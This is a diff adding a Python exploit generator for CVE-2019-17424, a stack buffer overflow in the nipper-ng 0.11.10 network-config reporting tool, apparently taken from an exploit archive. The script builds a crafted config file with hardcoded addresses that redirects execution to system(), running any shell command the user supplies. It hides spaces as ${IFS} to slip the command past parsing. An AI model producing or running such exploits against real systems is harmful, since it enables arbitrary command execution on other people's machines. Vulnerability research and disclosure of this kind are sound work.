@@ -1,0 +1,100 @@
+# Exploit Title: nipper-ng 0.11.10 - Remote Buffer Overflow (PoC)
+# Date: 2019-10-20
+# Exploit Author: Guy Levin
+# https://blog.vastart.dev
+# Vendor Homepage: https://tools.kali.org/reporting-tools/nipper-ng
+# Software Link: https://code.google.com/archive/p/nipper-ng/source/default/source
+# Version:  0.11.10
+# Tested on: Debian
+# CVE : CVE-2019-17424
+
+"""
+    Exploit generator created by Guy Levin (@va_start - twitter.com/va_start)
+    Vulnerability found by Guy Levin (@va_start - twitter.com/va_start)
+
+    For a detailed writeup of CVE-2019-17424 and the exploit building process, read my blog post
+    https://blog.vastart.dev/2019/10/stack-overflow-cve-2019-17424.html
+
+    may need to run nipper-ng with enviroment variable LD_BIND_NOW=1 on ceratin systems
+"""
+
+import sys
+import struct
+
+def pack_dword(i):
+    return struct.pack("<I", i)
+
+def prepare_shell_command(shell_command):
+    return shell_command.replace(" ", "${IFS}")
+
+def build_exploit(shell_command):
+    EXPLOIT_SKELETON = r"privilage exec level 1 " \
+                        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa " \
+                        "aasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab " \
+                        "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaacca " \
+                        "acdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaac " \
+                        "uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadma " \
+                        "adnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaae " \
+                        "faaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewa " \
+                        "aexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaaf " \
+                        "paafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaagha " \
+                        "agiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaag " \
+                        "zaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahra " \
+                        "ahaaaataahuaahvaahwaahpaaaaaaazaaibaaicaaidaaieaaifaaigaaihaaiiaaijaai " \
+                        "kaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajca " \
+                        "ajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaaj"
+
+    WRITEABLE_BUFFER = 0x080FA001
+    CALL_TO_SYSTEM = 0x0804E870
+    COMMAND_BUFFER = 0x080FA015 
+
+    OFFSET_FOR_WRITEABLE_BUFFER = 0x326
+    OFFSET_FOR_RETURN = 0x33a
+    OFFSET_FOR_COMMAND_BUFFER = 0x33e
+    
+    OFFSET_FOR_SHELL_COMMAND = 0x2a
+    MAX_SHELL_COMMAND_CHARS = 48
+
+    target_values_at_offsets = {
+        WRITEABLE_BUFFER : OFFSET_FOR_WRITEABLE_BUFFER, 
+        CALL_TO_SYSTEM : OFFSET_FOR_RETURN, 
+        COMMAND_BUFFER : OFFSET_FOR_COMMAND_BUFFER
+        }
+
+    exploit = bytearray(EXPLOIT_SKELETON, "ascii")
+    
+    # copy pointers
+    for target_value, target_offset in target_values_at_offsets.items():
+        target_value = pack_dword(target_value)
+        exploit[target_offset:target_offset+len(target_value)] = target_value
+
+    # copy payload
+    if len(shell_command) > MAX_SHELL_COMMAND_CHARS:
+        raise ValueError("shell command is too big")
+    shell_command = prepare_shell_command(shell_command)
+    if len(shell_command) > MAX_SHELL_COMMAND_CHARS:
+        raise ValueError("shell command is too big after replacing spaces")
+
+    # adding padding to end of shell command
+    for i, letter in enumerate(shell_command + "&&"):
+        exploit[OFFSET_FOR_SHELL_COMMAND+i] = ord(letter)
+
+    return exploit
+
+def main():
+    if len(sys.argv) != 3:
+        print(f"usage: {sys.argv[0]} <shell command to execute> <output file>")
+        return 1
+
+    try:
+        payload = build_exploit(sys.argv[1])
+    except Exception as e:
+        print(f"error building exploit: {e}")
+        return 1
+
+    open(sys.argv[2], "wb").write(payload)
+
+    return 0 # success
+
+if __name__ == '__main__':
+    main()
